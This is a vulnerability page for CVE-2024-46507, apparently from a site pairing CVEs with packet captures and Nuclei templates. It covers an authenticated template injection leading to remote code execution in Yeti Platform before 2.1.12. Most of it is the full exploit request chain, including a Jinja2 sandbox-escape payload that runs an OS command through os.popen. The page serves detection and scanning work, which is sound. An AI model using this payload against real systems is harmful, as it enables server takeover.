---
layout: "post"
cve_id: "CVE-2024-46507"
title: "Yeti Platform < 2.1.12 - Server-Side Template Injection to RCE"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-46507.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-46507.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "high"
impact: "Successful exploitation enables an attacker to execute arbitrary system commands, potentially leading to full server compromise.
"
remediation: "Upgrade to Yeti Platform 2.1.12 or later to mitigate this vulnerability.
"
reference:
  - "https://rhinosecuritylabs.com/research/cve-2024-46507-yeti-server-side-template-injection-ssti/"
metadata: "{'shodan-query': 'html:"Yeti</title>"', 'verified': True, 'max-request': 4}"
tags:
  - "cve"
  - "cve2024"
  - "yeti"
  - "platform"
  - "ssti"
  - "rce"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
The Yeti Platform < 2.1.12 contains a Server-Side Template Injection (SSTI) vulnerability that can lead to Remote Code Execution (RCE) when exploited by an authenticated user. Attackers with valid credentials can inject malicious template expressions, which the server evaluates, allowing arbitrary command execution.


## üåê HTTP Request
```nohighlight
POST /api/v2/auth/token HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
Content-Length: 248
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryodI9qNm7xBZLCq9n
Accept-Encoding: gzip

------WebKitFormBoundaryodI9qNm7xBZLCq9n
Content-Disposition: form-data; name="username"

ryFdsM
------WebKitFormBoundaryodI9qNm7xBZLCq9n
Content-Disposition: form-data; name="password"

pkAizTsm
------WebKitFormBoundaryodI9qNm7xBZLCq9n--
```

```nohighlight
POST /api/v2/templates/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/619.23 (KHTML, like Gecko) Version/15.3.85 Safari/619.23
Connection: close
Content-Length: 341
Content-Type: application/json
Accept-Encoding: gzip

{"template":{"name":"AA","template":"value,tags\n{% for obj in data %}BHfR0s,{{\";\".join(obj.tags.keys())}}\n{% endfor %}\n\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"echo Q1ZFLTIwMjQtNDY1MDcK | base64 -d\").read()}}{%endif%}{% endfor %}"}}
```

```nohighlight
POST /api/v2/observables/extended HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 52
Content-Type: application/json
Accept-Encoding: gzip

{"observable":{"type":"ipv4","value":"1.9.158.189"}}
```

```nohighlight
POST /api/v2/templates/render HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Connection: close
Content-Length: 70
Content-Type: application/json
Accept-Encoding: gzip

{"template_id":"xVI6Hq","observable_ids":["u11L4R"],"search_query":""}
```

